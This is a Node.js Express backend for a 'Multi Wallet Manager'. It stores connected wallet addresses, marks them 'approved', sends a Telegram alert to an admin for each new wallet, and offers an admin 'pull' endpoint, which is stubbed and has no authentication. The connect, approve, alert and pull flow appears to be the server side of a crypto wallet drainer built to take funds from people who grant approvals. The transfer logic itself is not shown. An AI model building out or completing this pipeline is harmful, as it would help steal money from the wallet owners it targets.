const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const database = require('./config/database');
const telegram = require('./config/telegram');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware - FIXED: Added missing closing parenthesis
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' })); // ← Fixed this line

// Database connection
database.connect();

// Telegram bot initialization
telegram.init();

// Routes
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        service: 'Multi Wallet Manager Backend',
        telegram: telegram.isInitialized ? 'Connected' : 'Not Connected'
    });
});

// Telegram webhook endpoint - this is what Telegram will call
app.post(`/telegram/${process.env.TELEGRAM_BOT_TOKEN}`, async (req, res) => {
    try {
        console.log('Received Telegram webhook update');
        // Process the Telegram update
        await telegram.processUpdate(req.body);
        res.status(200).send('OK');
    } catch (error) {
        console.error('Error processing Telegram webhook:', error);
        res.status(500).send('Error');
    }
});

// Test endpoint to manually trigger a message
app.get('/test-alert', async (req, res) => {
    try {
        if (process.env.ADMIN_CHAT_ID) {
            await telegram.sendWelcomeMessage(process.env.ADMIN_CHAT_ID);
            res.json({ success: true, message: 'Test message sent' });
        } else {
            res.status(400).json({ success: false, error: 'ADMIN_CHAT_ID not set' });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/wallets/connect', async (req, res) => {
    try {
        const { address, name } = req.body;
        
        console.log('Wallet connection request:', { address, name });
        
        // Validate address
        if (!address || address.length !== 42) {
            return res.status(400).json({
                success: false,
                error: 'Invalid wallet address'
            });
        }
        
        // Save wallet to database
        const query = `
            INSERT INTO wallets (address, name, created_at, updated_at)
            VALUES ($1, $2, NOW(), NOW())
            ON CONFLICT (address) DO UPDATE
            SET updated_at = NOW()
            RETURNING *
        `;
        
        const result = await database.query(query, [address, name || 'Unnamed Wallet']);
        const wallet = result.rows[0];
        
        console.log('Wallet saved to database:', wallet.address);
        
        // Send alert to admin
        await telegram.sendNewWalletAlert(address, '0');
        
        res.json({
            success: true,
            wallet: {
                id: wallet.id,
                address: wallet.address,
                name: wallet.name,
                created_at: wallet.created_at
            }
        });
    } catch (error) {
        console.error('Wallet connection error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.post('/api/wallets/approve', async (req, res) => {
    try {
        const { address } = req.body;
        
        // Update approval status in database
        const query = `
            UPDATE wallets 
            SET is_approved = true, updated_at = NOW()
            WHERE address = $1
            RETURNING *
        `;
        
        const result = await database.query(query, [address]);
        
        if (result.rows.length === 0) {
            return res.status(404).json({
                success: false,
                error: 'Wallet not found'
            });
        }
        
        res.json({
            success: true,
            message: 'Wallet approved successfully'
        });
    } catch (error) {
        console.error('Wallet approval error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Admin routes
app.post('/api/admin/pull', async (req, res) => {
    try {
        const { walletAddress } = req.body;
        
        // In a real implementation, you'd add admin authentication here
        // For now, we'll proceed with the logic
        
        res.json({
            success: true,
            message: 'Pull initiated successfully',
            walletAddress: walletAddress
        });
    } catch (error) {
        console.error('Pull wallet error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.get('/api/wallets/:address/balance', async (req, res) => {
    try {
        const { address } = req.params;
        
        // Validate address
        if (!address || address.length !== 42) {
            return res.status(400).json({
                success: false,
                error: 'Invalid wallet address'
            });
        }
        
        // In a real implementation, you'd query the blockchain
        // For now, return mock data
        const mockBalance = '150.50';
        
        res.json({
            success: true,
            balance: mockBalance,
            address: address
        });
    } catch (error) {
        console.error('Balance check error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Unhandled error:', err);
    res.status(500).json({
        success: false,
        error: 'Internal server error'
    });
});

// Handle 404
app.use((req, res) => {
    res.status(404).json({
        success: false,
        error: 'Route not found'
    });
});

const server = app.listen(PORT, '0.0.0.0', async () => {
    console.log(`🚀 Multi Wallet Manager backend running on port ${PORT}`);
    console.log(`📡 Webhook URL will be: https://your-render-url.onrender.com/telegram/${process.env.TELEGRAM_BOT_TOKEN}`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM received, shutting down gracefully');
    server.close(() => {
        console.log('Process terminated');
        process.exit(0);
    });
});

module.exports = app;
